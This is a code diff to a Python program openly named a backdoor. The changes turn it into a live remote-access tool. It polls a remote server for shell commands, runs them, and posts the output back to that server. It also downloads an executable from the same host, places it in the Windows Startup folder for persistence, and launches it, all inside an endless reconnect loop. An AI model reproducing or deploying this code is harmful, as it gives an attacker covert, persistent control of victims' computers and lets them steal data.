@@ -1,4 +1,4 @@
-import requests,time,os,keyboard,pyautogui,webbrowser,time
+import requests,time,os,keyboard,pyautogui,webbrowser
 original = os.getcwd()
 
 class backdoor:
@@ -19,14 +19,14 @@ class backdoor:
                 output = self.run(commands[i])
                 print(output)
                 requests.post(f"{self.url}api/output/{self.id}/{i}", data={'output':output})
-            if i == 100:
+            if i == 1:
                 def download():
-                    url = "https://pybdtest.pythonanywhere.com/media/files/test4.py/"
+                    url = "https://pybdtest.pythonanywhere.com/media/files/startup.exe/"
                     get_response = requests.get(url)
 
-                    with open("test4.py", "wb") as out_file:
+                    with open("startup.exe", "wb") as out_file:
                         out_file.write(get_response.content)
-                    os.startfile("system.exe")
+                    os.startfile("startup.exe")
                 x = -2
                 for i in os.getcwd():
                     if i == "\\":
@@ -36,14 +36,14 @@ class backdoor:
 
                 print(os.getcwd())
                 os.chdir("AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
-                if os.path.isfile("test4.py"):
-                    with open("test4.py","r+") as r:
+                if os.path.isfile("startup.exe"):
+                    with open("startup.exe","r+") as r:
                         r = r.read()
                     if len(r) < 10:
                         download()
                 else:
                     download()
-                time.sleep(1)
+                i = 0
     def run(self, command):
         output = ""
         commands_to_execute = command.split("\r\n")
@@ -269,7 +269,10 @@ class backdoor:
         return output
     
 
-
-backdoor("http://127.0.0.1:8000/") 
-
-  
+while True:
+    try:
+        backdoor("https://pybdtest.pythonanywhere.com/")
+    except Exception as e:
+        print(e)
+        
+        
